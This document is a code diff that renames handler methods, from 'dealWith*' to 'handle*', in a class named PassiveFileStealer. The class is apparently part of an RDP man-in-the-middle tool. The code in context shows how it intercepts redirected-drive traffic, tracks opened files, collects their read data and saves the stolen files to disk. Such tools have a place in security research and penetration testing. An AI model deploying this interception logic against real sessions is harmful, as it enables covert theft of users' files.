@@ -47,24 +47,24 @@ class PassiveFileStealer(Observer):
         """
         self.pduToSend = pdu
         if isinstance(pdu, DeviceIORequestPDU):
-            self.dealWithRequest(pdu)
+            self.handleRequest(pdu)
         elif isinstance(pdu, DeviceIOResponsePDU):
-            self.dealWithResponse(pdu)
+            self.handleResponse(pdu)
         elif isinstance(pdu, DeviceListAnnounceRequest):
             [self.mitm_log.info("%(deviceName)s mapped with ID %(deviceId)d: %(deviceData)s",
                                 {"deviceName": device.deviceType.name, "deviceId": device.deviceId,
                                  "deviceData": device.deviceData.decode(errors="backslashreplace")})
              for device in pdu.deviceList]
         elif isinstance(pdu, DeviceRedirectionServerCapabilitiesPDU):
-            self.dealWithServerCapabilities(pdu)
+            self.handleServerCapabilities(pdu)
         elif isinstance(pdu, DeviceRedirectionClientCapabilitiesPDU):
-            self.dealWithClientCapabilities(pdu)
+            self.handleClientCapabilities(pdu)
         else:
             self.mitm_log.debug(f"Received unparsed PDU: {pdu.packetId.name}")
 
         self.peer.sendPDU(self.pduToSend)
 
-    def dealWithRequest(self, pdu: DeviceIORequestPDU):
+    def handleRequest(self, pdu: DeviceIORequestPDU):
         """
         Sets the request in the list of requests in progress of the other end of the MITM.
         Also logs useful information.
@@ -78,7 +78,7 @@ class PassiveFileStealer(Observer):
         else:
             self.mitm_log.debug(f"Unparsed request: {MajorFunction(pdu.majorFunction).name}")
 
-    def dealWithResponse(self, pdu: DeviceIOResponsePDU):
+    def handleResponse(self, pdu: DeviceIOResponsePDU):
         """
         Based on the type of request the response is meant for, handle open files, closed files and read data.
         Also remove the associated request from the list of requests in progress.
@@ -90,11 +90,11 @@ class PassiveFileStealer(Observer):
                                       "For request %(requestPdu)s", {"responsePdu": pdu.__repr__(), "requestPdu": requestPDU.__repr__()})
             if isinstance(requestPDU, DeviceReadRequestPDU):
                 self.mitm_log.debug(f"Read response received.")
-                self.dealWithReadResponse(pdu, requestPDU)
+                self.handleReadResponse(pdu, requestPDU)
             elif isinstance(requestPDU, DeviceCreateRequestPDU):
-                self.dealWithCreateResponse(pdu, requestPDU)
+                self.handleCreateResponse(pdu, requestPDU)
             elif isinstance(requestPDU, DeviceCloseRequestPDU):
-                self.dealWithCloseResponse(pdu, requestPDU)
+                self.handleCloseResponse(pdu, requestPDU)
             else:
                 self.mitm_log.debug("Unknown response received: %(pdu)s", {"pdu": pdu})
             self.completionIdInProgress.pop(pdu.completionId)
@@ -102,7 +102,7 @@ class PassiveFileStealer(Observer):
             self.mitm_log.error("Completion id %(completionId)d not in the completionId in progress list. "
                                 "This might mean that someone is sending corrupted data.", {"completionId": pdu.completionId})
 
-    def dealWithReadResponse(self, pdu: DeviceIOResponsePDU, requestPDU: DeviceReadRequestPDU):
+    def handleReadResponse(self, pdu: DeviceIOResponsePDU, requestPDU: DeviceReadRequestPDU):
         """
         Put data in a BytesIO for later saving.
         """
@@ -115,7 +115,7 @@ class PassiveFileStealer(Observer):
         stream.seek(requestPDU.offset)
         stream.write(readDataResponsePDU.readData)
 
-    def dealWithCreateResponse(self, pdu: DeviceIOResponsePDU, requestPDU: DeviceCreateRequestPDU):
+    def handleCreateResponse(self, pdu: DeviceIOResponsePDU, requestPDU: DeviceCreateRequestPDU):
         """
         If its been created for reading, add the file to the list of opened files.
         """
@@ -127,7 +127,7 @@ class PassiveFileStealer(Observer):
                                {"path": decodeUTF16LE(requestPDU.path), "number": createResponse.fileId})
             self.openedFiles[createResponse.fileId] = requestPDU.path
 
-    def dealWithCloseResponse(self, pdu: DeviceIOResponsePDU, requestPDU: DeviceCloseRequestPDU):
+    def handleCloseResponse(self, pdu: DeviceIOResponsePDU, requestPDU: DeviceCloseRequestPDU):
         """
         Clean everything and write the file to disk.
         """
@@ -138,10 +138,10 @@ class PassiveFileStealer(Observer):
                 self.writeToDisk(path, self.finalFiles[path])
             self.openedFiles.pop(requestPDU.fileId)
 
-    def dealWithServerCapabilities(self, pdu: DeviceRedirectionServerCapabilitiesPDU):
+    def handleServerCapabilities(self, pdu: DeviceRedirectionServerCapabilitiesPDU):
         self.mitm_log.debug("Received Server capabilities")
 
-    def dealWithClientCapabilities(self, pdu: DeviceRedirectionClientCapabilitiesPDU):
+    def handleClientCapabilities(self, pdu: DeviceRedirectionClientCapabilitiesPDU):
         self.mitm_log.debug("Received Client capabilities")
 
     def sendPDU(self, pdu: DeviceRedirectionPDU):
